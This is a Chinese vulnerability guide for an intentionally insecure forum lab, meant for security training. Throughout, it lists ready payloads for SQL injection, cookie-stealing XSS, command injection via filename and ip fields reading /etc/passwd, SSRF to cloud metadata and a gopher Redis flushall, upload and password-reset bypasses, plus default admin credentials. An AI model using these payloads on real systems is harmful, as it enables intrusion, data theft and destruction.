# WEB安全靶场漏洞说明文档

本文档详细说明了BBS论坛系统中存在的安全漏洞，供安全学习和测试使用。

---

## 一、SQL注入漏洞

### 1.1 搜索功能SQL注入
**漏洞位置**: `/home/search.php`
**漏洞类型**: 联合注入
**利用方式**:
```
GET /home/search.php?keywords=test' union select 1,2,3,4,5,6,7,8,9,10--
```

### 1.2 帖子列表SQL注入
**漏洞位置**: `/home/action/tiezi.php` - index()方法
**漏洞类型**: 字符型注入
**利用方式**:
```
GET /home/index.php?m=tiezi&a=index&bk=1' and 1=1--
```

### 1.3 帖子详情SQL注入
**漏洞位置**: `/home/action/tiezi.php` - detail()方法
**利用方式**:
```
GET /home/index.php?m=tiezi&a=detail&bk=1&zt=1' and 1=1--
```

---

## 二、XSS漏洞

### 2.1 存储型XSS
**漏洞位置**: `/home/action/tiezi.php` - reply()方法
**触发位置**: 帖子回复内容
**利用方式**:
```html
回复内容填入: <script>alert(document.cookie)</script>
```

### 2.2 帖子内容XSS
**漏洞位置**: `/home/fatie.php`
**触发位置**: 帖子标题和内容

---

## 三、命令执行漏洞

### 3.1 数据库备份命令注入
**漏洞位置**: `/admin/action/backup.php` - _do_backup()方法
**漏洞类型**: 命令注入
**利用方式**:
```
POST /admin/index.php?m=backup&a=_do_backup
filename=test;cat /etc/passwd;

或者:
filename=test|id
filename=test`whoami`
```

### 3.2 Ping工具命令注入
**漏洞位置**: `/admin/action/backup.php` - _do_ping()方法
**利用方式**:
```
POST /admin/index.php?m=backup&a=_do_ping
ip=127.0.0.1;cat /etc/passwd
ip=127.0.0.1|id
```

---

## 四、SSRF漏洞

### 4.1 远程头像SSRF
**漏洞位置**: `/home/action/user.php` - _set_remote_avatar()方法
**利用方式**:
```
# 探测内网服务
avatar_url=http://127.0.0.1:6379/

# 读取云服务器元数据
avatar_url=http://169.254.169.254/latest/meta-data/

# 读取本地文件(file协议)
avatar_url=file:///etc/passwd

# 攻击内网Redis
avatar_url=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a...
```

---

## 五、文件上传漏洞

### 5.1 附件上传绕过
**漏洞位置**: `/home/action/user.php` - _upload_file()方法
**漏洞类型**: 多种绕过方式

**绕过方式1: MIME类型绕过**
```
上传test.php，修改Content-Type为image/jpeg
```

**绕过方式2: 黑名单绕过**
```
使用不在黑名单中的后缀: .php3, .php5, .phtml, .phar, .php.jpg
```

**绕过方式3: 前端JS绕过**
```
禁用浏览器JavaScript后直接上传
```

---

## 六、越权漏洞

### 6.1 水平越权-修改他人资料
**漏洞位置**: `/home/action/user.php` - basic()和_dobasic()方法
**利用方式**:
```
# 步骤1: 访问其他用户的资料编辑页面
GET /home/index.php?m=user&a=basic&uid=1

# 步骤2: 修改表单中的uid为其他用户ID，提交修改
POST /home/index.php?m=user&a=_dobasic
uid=1&t_name=被修改的名字&...
```

---

## 七、密码任意修改漏洞

### 7.1 找回密码逻辑漏洞
**漏洞位置**: `/home/action/user.php` - _re_passwd_step3()方法
**漏洞类型**: Token验证绕过
**利用方式**:
```
# 直接访问重置密码页面，传入目标邮箱和空code参数
GET /home/index.php?m=user&a=re_passwd_step3&email=target@example.com&code=

# 提交新密码
POST /home/index.php?m=user&a=_re_passwd_step3
email=target@example.com&code=&password=newpass&repassword=newpass
```

### 7.2 Token可预测
**漏洞位置**: `/home/action/user.php` - _re_passwd_step1()方法
**漏洞类型**: 使用时间戳MD5作为Token，可预测
**利用方式**:
```
# Token生成方式: md5(time())
# 可根据发送时间推算Token值
```

---

## 八、验证码绕过漏洞

### 8.1 后台登录验证码绕过
**漏洞位置**: `/admin/public/login.php`
**漏洞类型**: 验证码复用 + 空验证码绕过
**利用方式**:
```
# 方式1: 使用已使用过的验证码重复登录
# 方式2: 留空验证码字段（需要特定条件）
```

### 8.2 前台登录无验证码
**漏洞位置**: `/home/public/login.php`
**说明**: 前台登录完全没有验证码保护，可进行暴力破解

---

## 九、其他漏洞

### 9.1 用户信息页面SQL注入
**漏洞位置**: `/home/action/user.php` - info()方法
**利用方式**:
```
GET /home/index.php?m=user&a=info&id=1 union select...
```

### 9.2 信息泄露
- 配置文件中包含数据库密码
- 错误信息直接暴露SQL语句
- 存在.git目录泄露风险

---

## 测试账号

| 用户名 | 密码 | 权限 |
|--------|------|------|
| admin | 123456 | 管理员 |
| test | 123456 | 普通用户 |

---

## 免责声明

本靶场系统仅供安全学习和授权测试使用，请勿用于非法用途。
